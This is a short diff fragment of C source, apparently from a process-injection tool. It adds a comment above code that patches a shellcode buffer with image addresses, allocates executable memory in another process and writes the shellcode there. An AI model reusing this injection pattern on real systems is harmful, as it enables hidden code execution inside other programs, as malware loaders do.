@@ -370,6 +370,7 @@ int main(int argc, char **argv) {
 	*((unsigned long*)(shellCode + 16)) = (unsigned long)destImageBase + pEAT[1];
 	*((unsigned long*)(shellCode + 21)) = (unsigned long)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
 	
+	// Write shellcode to remote process
 	void* addressBuffer = pVirtualAllocEx(pProcessInfo->hProcess, NULL, sizeof(shellCode), MEMCOMMIT | MEMRESERVE, PAGEEXECUTEREADWRITE);
 	bool successfulWrite = pWriteProcessMemory(pProcessInfo->hProcess, addressBuffer, shellCode, sizeof(shellCode), NULL);
 	if (!successfulWrite) {
